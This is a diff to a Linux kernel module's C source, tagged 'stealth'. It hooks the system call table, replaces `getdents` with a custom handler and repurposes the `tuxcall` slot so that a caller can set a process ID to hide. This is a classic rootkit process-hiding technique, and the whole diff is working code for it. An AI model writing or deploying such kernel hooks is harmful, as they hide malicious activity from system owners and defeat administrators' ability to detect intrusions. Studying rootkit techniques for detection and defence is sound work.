@@ -19,12 +19,14 @@ MODULE_DESCRIPTION("Loadable Kernel Module Syscall");
 MODULE_VERSION("0.1");
 
 #define SYS_CALL_TABLE "sys_call_table"
-//#define SYSCALL_NI __NR_tuxcall
-#define SYSCALL_NI __NR_getdents
+#define SYSCALL_NI __NR_tuxcall
+#define SYSCALL_GD __NR_getdents
 #define TAG "stealth"
 
 static ulong *syscall_table = NULL;
 static void *original_syscall = NULL;
+static void *original_syscall_getdents = NULL;
+static int hidden_pid;
 static char buffer[32768];
 
 struct linux_dirent {
@@ -35,6 +37,13 @@ struct linux_dirent {
 };
 
 typedef int (*getdents)(unsigned int, struct linux_dirent *, unsigned int);
+
+static unsigned long lkm_syscall_hide(int pid)
+{
+    printk("%s: Hiding PID %i\n", TAG, pid);
+    hidden_pid = pid;
+    return 0;
+}
 
 static int lkm_syscall_getdents(unsigned int fd,
         struct linux_dirent *dirp, unsigned int count)
@@ -111,7 +120,10 @@ static void replace_syscall(ulong offset, ulong func_address, void *old_func)
 static int init_syscall(void)
 {
     printk(KERN_INFO "%s: Custom syscall loaded\n", TAG);
-    replace_syscall(SYSCALL_NI, (ulong)lkm_syscall_getdents);
+    replace_syscall(SYSCALL_GD, (ulong)lkm_syscall_getdents,
+            &original_syscall_getdents);
+    replace_syscall(SYSCALL_NI, (ulong)lkm_syscall_hide,
+            &original_syscall);
     return 0;
 }
 
@@ -119,6 +131,7 @@ static void cleanup_syscall(void)
 {
     page_read_write((ulong)syscall_table);
     syscall_table[SYSCALL_NI] = (ulong)original_syscall;
+    syscall_table[SYSCALL_GD] = (ulong)original_syscall_getdents;
     page_read_only((ulong)syscall_table);
     printk(KERN_INFO "%s: Syscall at offset %d : %p\n", TAG, SYSCALL_NI,
             (void *)syscall_table[SYSCALL_NI]);
